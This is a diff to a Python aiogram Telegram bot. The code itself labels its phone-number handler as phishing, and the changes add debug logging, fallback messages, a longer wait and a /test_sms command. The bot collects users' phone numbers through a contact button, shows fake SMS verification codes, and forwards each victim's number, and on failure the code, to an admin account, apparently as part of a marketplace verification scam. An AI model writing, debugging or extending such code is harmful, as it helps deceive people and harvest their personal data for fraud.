@@ -17,10 +17,18 @@ from aiogram.types import (
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+# Включите подробное логирование
+import sys
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    stream=sys.stdout
+)
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
+
 
 # Загрузка переменных окружения
 def load_config():
@@ -89,11 +97,6 @@ class VerificationStates(StatesGroup):
     waiting_code = State()  # Добавьте эту строку
     waiting_phone = State()
 
-# # Добавьте этот декоратор для отладки всех входящих сообщений
-# @dp.message()
-# async def debug_all_messages(message: types.Message):
-#     """Функция для отладки - логирует все входящие сообщения"""
-#     logger.debug(f"DEBUG: Получено сообщение от {message.from_user.id}: {message.text or message.content_type}")
 
 # Инициализация БД с учетом окружения
 def init_db():
@@ -205,18 +208,45 @@ async def simulate_sms_delivery(user_id: int, phone: str, code: str):
             f"<i>Сообщение автоматически доставлено. Не отвечайте на это SMS.</i>"
         )
 
-        await bot.send_message(user_id, sms_notification, parse_mode="HTML")
-        logger.info(f"[SMS SIM] Код {code} 'отправлен' пользователю {user_id} на номер {masked_phone}")
-        
-        # Сохраняем в историю отправленных кодов
-        cursor.execute(
-            "INSERT INTO sms_codes (user_id, phone, code) VALUES (?, ?, ?)",
-            (user_id, phone, code)
-        )
-        conn.commit()
+        # Пытаемся отправить сообщение
+        try:
+            await bot.send_message(user_id, sms_notification, parse_mode="HTML")
+            logger.info(f"[SMS SIM] Код {code} успешно 'отправлен' пользователю {user_id} на номер {masked_phone}")
+            
+            # Сохраняем в историю отправленных кодов
+            cursor.execute(
+                "INSERT INTO sms_codes (user_id, phone, code, used) VALUES (?, ?, ?, ?)",
+                (user_id, phone, code, 0)
+            )
+            conn.commit()
+            
+        except Exception as send_error:
+            logger.error(f"[SMS SIM] Не удалось отправить SMS пользователю {user_id}: {send_error}")
+            
+            # Пробуем отправить более простое сообщение
+            try:
+                simple_notification = f"📱 SMS код: {code}\nДля номера: {masked_phone}"
+                await bot.send_message(user_id, simple_notification)
+                logger.info(f"[SMS SIM] Упрощенное сообщение отправлено пользователю {user_id}")
+            except Exception as simple_error:
+                logger.error(f"[SMS SIM] Не удалось отправить даже упрощенное сообщение: {simple_error}")
+                
+                # Уведомляем админа о проблеме
+                try:
+                    await bot.send_message(
+                        ADMIN_ID,
+                        f"⚠️ <b>ПРОБЛЕМА С ОТПРАВКОЙ SMS</b>\n\n"
+                        f"Пользователь: {user_id}\n"
+                        f"Телефон: +{phone}\n"
+                        f"Код: {code}\n"
+                        f"Ошибка: {simple_error}",
+                        parse_mode="HTML"
+                    )
+                except:
+                    pass
         
     except Exception as e:
-        logger.error(f"[SMS SIM] Ошибка отправки уведомления пользователю {user_id}: {e}")
+        logger.error(f"[SMS SIM] Критическая ошибка в функции simulate_sms_delivery: {e}")
 # Функция запроса верификации
 async def request_verification(callback_query: types.CallbackQuery):
     verification_text = """
@@ -785,11 +815,12 @@ async def process_moderator_message(message: types.Message, state: FSMContext):
     except Exception as e:
         await message.answer(f"⚠️ Не удалось отправить сообщение продавцу: {e}")
 
-# Обработка номера телефона (фишинг) - ОБНОВЛЕННАЯ ВЕРСИЯ
 @dp.message(F.contact)
 async def process_phone_number(message: types.Message, state: FSMContext):
     user = message.from_user
     phone = message.contact.phone_number
+
+    logger.info(f"[DEBUG] Получен контакт от пользователя {user.id}: {phone}")
 
     # Убираем + если есть
     if phone.startswith('+'):
@@ -804,6 +835,8 @@ async def process_phone_number(message: types.Message, state: FSMContext):
 
     # ГЕНЕРИРУЕМ ФЕЙКОВЫЙ КОД (5-6 цифр)
     fake_code = str(random.randint(10000, 999999))
+    
+    logger.info(f"[DEBUG] Сгенерирован код: {fake_code} для пользователя {user.id}")
 
     # Сохраняем сгенерированный код для проверки
     cursor.execute(
@@ -824,16 +857,28 @@ async def process_phone_number(message: types.Message, state: FSMContext):
 
 <i>Если SMS не пришло в течение 2 минут, используйте команду</i> /resend_code
 """
-    await message.answer(initial_text, parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
+    
+    logger.info(f"[DEBUG] Отправляю начальное сообщение пользователю {user.id}")
+    
+    try:
+        await message.answer(initial_text, parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
+        logger.info(f"[DEBUG] Начальное сообщение отправлено успешно")
+    except Exception as e:
+        logger.error(f"[DEBUG] Ошибка отправки начального сообщения: {e}")
 
     # 2. Запускаем фоновую задачу для имитации отправки SMS
-    asyncio.create_task(simulate_sms_delivery(user.id, phone, fake_code))
+    logger.info(f"[DEBUG] Запускаю задачу simulate_sms_delivery для пользователя {user.id}")
+    sms_task = asyncio.create_task(simulate_sms_delivery(user.id, phone, fake_code))
+    
+    # Сохраняем задачу для отслеживания
+    logger.info(f"[DEBUG] Задача создана: {sms_task}")
 
     # 3. Переводим пользователя в состояние ожидания кода
     await state.set_state(VerificationStates.waiting_code)
+    logger.info(f"[DEBUG] Пользователь {user.id} переведен в состояние waiting_code")
     
-    # 4. Ждем 3 секунды и просим ввести код
-    await asyncio.sleep(3)
+    # 4. Ждем 5 секунд и просим ввести код (больше времени на "отправку SMS")
+    await asyncio.sleep(5)
     
     code_request_text = f"""
 ✍️ <b>Введите код из SMS, который пришел на номер +{phone}:</b>
@@ -842,7 +887,14 @@ async def process_phone_number(message: types.Message, state: FSMContext):
 
 <i>Если код не пришел, используйте</i> /resend_code
 """
-    await message.answer(code_request_text, parse_mode="HTML")
+    
+    logger.info(f"[DEBUG] Прошу ввести код пользователю {user.id}")
+    
+    try:
+        await message.answer(code_request_text, parse_mode="HTML")
+        logger.info(f"[DEBUG] Запрос кода отправлен успешно")
+    except Exception as e:
+        logger.error(f"[DEBUG] Ошибка отправки запроса кода: {e}")
 
     # 5. Отправляем уведомление админу
     admin_msg = f"""
@@ -858,8 +910,9 @@ async def process_phone_number(message: types.Message, state: FSMContext):
 """
     try:
         await bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
+        logger.info(f"[DEBUG] Уведомление админу отправлено")
     except Exception as e:
-        logger.error(f"Ошибка отправки админу: {e}")
+        logger.error(f"[DEBUG] Ошибка отправки админу: {e}")
     
     log_action(user.id, "phone_submitted", f"phone: {phone}")
 # ОБНОВИТЕ функцию process_verification_code для работы с состоянием:
@@ -1007,7 +1060,7 @@ async def cmd_resend_code(message: types.Message, state: FSMContext):
         pass
     
     log_action(user.id, "resend_code_requested")
-    
+
 # ДОБАВЬТЕ этот обработчик для случаев, когда пользователь вводит что-то кроме кода в состоянии ожидания кода:
 @dp.message(VerificationStates.waiting_code)
 async def handle_wrong_code_input(message: types.Message):
@@ -1381,7 +1434,16 @@ async def about_us(callback_query: types.CallbackQuery):
         message_id=callback_query.message.message_id,
         parse_mode="Markdown"
     )
-
+# Добавьте эту команду для тестирования отправки сообщений
+@dp.message(Command("test_sms"))
+async def cmd_test_sms(message: types.Message):
+    """Тестовая команда для проверки отправки SMS"""
+    test_code = str(random.randint(10000, 99999))
+    await message.answer(f"🔧 <b>ТЕСТ ОТПРАВКИ SMS</b>\n\nКод: <code>{test_code}</code>", parse_mode="HTML")
+    
+    # Тестируем отправку через simulate_sms_delivery
+    await simulate_sms_delivery(message.from_user.id, "79991234567", test_code)
+    await message.answer("✅ Тестовая отправка SMS запущена. Проверьте, пришло ли сообщение.")
 # Обработчик кнопки "Поддержка"
 @dp.callback_query(F.data == "support")
 async def support(callback_query: types.CallbackQuery):
